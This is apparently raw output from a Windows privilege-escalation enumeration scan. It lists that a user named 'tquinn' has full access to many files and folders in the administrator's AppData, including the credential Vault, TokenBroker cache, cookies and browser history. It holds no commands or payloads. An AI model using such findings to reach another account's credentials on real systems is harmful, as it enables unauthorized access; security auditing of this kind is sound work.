     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\gd": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\gl": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\gu": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ha-Latn-NG": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\he": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\hi": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\hr": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\hu": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\hy": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\id": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ig-NG": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\imageformats": tquinn [Allow: AllAccess]                                                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\IRMProtectors": tquinn [Allow: AllAccess]                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\is": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\it": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ja": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ka": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\kk": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\km-KH": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\kn": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ko": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\kok": tquinn [Allow: AllAccess]                                                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ku-Arab": tquinn [Allow: AllAccess]                                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ky": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\lb-LU": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\lt": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\lv": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\mi-NZ": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\mk": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ml-IN": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\mn": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\mr": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ms": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\mt-MT": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\nb-NO": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ne-NP": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\nl": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\nn-NO": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\nso-ZA": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\or-IN": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\pa": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\pa-Arab-PK": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\pl": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\platforms": tquinn [Allow: AllAccess]                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\prs-AF": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\pt-BR": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\pt-PT": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick.2": tquinn [Allow: AllAccess]                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick\Controls\Styles\Flat": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick\Controls\Styles": tquinn [Allow: AllAccess]                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick\Controls.2": tquinn [Allow: AllAccess]                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick\Extras": tquinn [Allow: AllAccess]                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick\Layouts": tquinn [Allow: AllAccess]                                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick\Templates.2": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\qml\QtQuick\Window.2": tquinn [Allow: AllAccess]                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\quc": tquinn [Allow: AllAccess]                                                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\quz-PE": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ro": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ru": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\rw": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sd-Arab-PK": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\si-LK": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sk": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sl": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sq": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sr-Cyrl-BA": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sr-Cyrl-RS": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sr-Latn-RS": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sv": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\sw": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ta": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\te": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tg": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\th": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ti": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tn-ZA": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tr": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tt": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ug": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\uk": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ur": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\uz-Latn-UZ": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\vi": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\wo": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\xh-ZA": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\yo-NG": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\zh-CN": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\zh-TW": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\zu-ZA": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013": tquinn [Allow: AllAccess]                                                                                   
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\PenWorkspace": tquinn [Allow: AllAccess]                                                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\PenWorkspace\DiscoverCacheData.dat": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\TokenBroker\Cache\cf7513a936f7effbb38627e56f8d1fce10eb12cc.tbres": tquinn [Allow: AllAccess]                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\TokenBroker\Cache": tquinn [Allow: AllAccess]                                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\TokenBroker\Cache\5a2a7058cf8d1e56c20e6b19a7c48eb2386d141b.tbres": tquinn [Allow: AllAccess]                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Vault\UserProfileRoaming": tquinn [Allow: AllAccess]                                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Vault\UserProfileRoaming\Latest.dat": tquinn [Allow: AllAccess]                                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCacheLock.dat": tquinn [Allow: AllAccess]                                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\UsrClass.dat{d1677f11-098a-11ec-9511-005056b9b2ce}.TMContainer00000000000000000002.regtrans-ms": tquinn [Allow: AllAccess]        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\UsrClass.dat{d1677f11-098a-11ec-9511-005056b9b2ce}.TMContainer00000000000000000001.regtrans-ms": tquinn [Allow: AllAccess]        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\UsrClass.dat{d1677f11-098a-11ec-9511-005056b9b2ce}.TM.blf": tquinn [Allow: AllAccess]                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG2": tquinn [Allow: AllAccess]                                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG1": tquinn [Allow: AllAccess]                                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows": tquinn [Allow: AllAccess]                                                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\UsrClass.dat": tquinn [Allow: AllAccess]                                                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group1\1 - Desktop.lnk": tquinn [Allow: AllAccess]                                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group1": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group1\desktop.ini": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group2\1 - Run.lnk": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group2\2 - Search.lnk": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group2\3 - Windows Explorer.lnk": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group2\4 - Control Panel.lnk": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group2\5 - Task Manager.lnk": tquinn [Allow: AllAccess]                                                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group2": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group2\desktop.ini": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\01 - Command Prompt.lnk": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\01a - Windows PowerShell.lnk": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\02 - Command Prompt.lnk": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\02a - Windows PowerShell.lnk": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\03 - Computer Management.lnk": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\04 - Disk Management.lnk": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\04-1 - NetworkStatus.lnk": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\05 - Device Manager.lnk": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\06 - SystemAbout.lnk": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\07 - Event Viewer.lnk": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\08 - PowerAndSleep.lnk": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\09 - Mobility Center.lnk": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\10 - AppsAndFeatures.lnk": tquinn [Allow: AllAccess]                                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WinX\Group3\desktop.ini": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.jfm": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\V01tmp.log": tquinn [Allow: AllAccess]                                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\V01res00002.jrs": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\V01res00001.jrs": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\V0100003.log": tquinn [Allow: AllAccess]                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\V01.log": tquinn [Allow: AllAccess]                                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\V01.chk": tquinn [Allow: AllAccess]                                                                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache": tquinn [Allow: AllAccess]                                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\WebCache\TempCompact.jfm": tquinn [Allow: AllAccess]                                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Shell": tquinn [Allow: AllAccess]                                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Shell\DefaultLayouts.xml": tquinn [Allow: AllAccess]                                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Safety\shell\remote": tquinn [Allow: AllAccess]                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Safety\shell\remote\script": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\PowerShell\PowerShellGet": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\PowerShell\PowerShellGet\PSRepositories.xml": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\PowerShell\ModuleAnalysisCache": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive": tquinn [Allow: AllAccess]                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\PowerShell": tquinn [Allow: AllAccess]                                                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db": tquinn [Allow: AllAccess]                                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db-shm": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db-wal": tquinn [Allow: AllAccess]                                                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Notifications": tquinn [Allow: AllAccess]                                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Notifications\WPNPRMRY.tmp": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\INetCookies\ESE": tquinn [Allow: AllAccess]                                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\INetCookies\ESE\container.dat": tquinn [Allow: AllAccess]                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\INetCache\IE": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\History\History.IE5": tquinn [Allow: AllAccess]                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\History\History.IE5\container.dat": tquinn [Allow: AllAccess]                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\History\History.IE5\MSHist012024110420241105": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\History\History.IE5\MSHist012024110420241105\container.dat": tquinn [Allow: AllAccess]                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\History": tquinn [Allow: AllAccess]                                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\History\desktop.ini": tquinn [Allow: AllAccess]                                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\ExplorerStartupLog.etl": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_1280.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_16.db": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_1920.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_256.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_2560.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_32.db": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_48.db": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_768.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_96.db": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_custom_stream.db": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_exif.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_idx.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_sr.db": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_wide.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\iconcache_wide_alternate.db": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1280.db": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_16.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1920.db": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_256.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_2560.db": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_32.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_48.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_768.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_96.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_custom_stream.db": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_exif.db": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_idx.db": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_sr.db": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_wide.db": tquinn [Allow: AllAccess]                                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer": tquinn [Allow: AllAccess]                                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Explorer\thumbcache_wide_alternate.db": tquinn [Allow: AllAccess]                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Caches": tquinn [Allow: AllAccess]                                                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Burn\Burn": tquinn [Allow: AllAccess]                                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Burn\Burn\desktop.ini": tquinn [Allow: AllAccess]                                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Application Shortcuts": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\Application Shortcuts\desktop.ini": tquinn [Allow: AllAccess]                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\1033": tquinn [Allow: AllAccess]                                                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows\1033\StructuredQuerySchema.bin": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows Sidebar\settings.ini": tquinn [Allow: AllAccess]                                                                                  
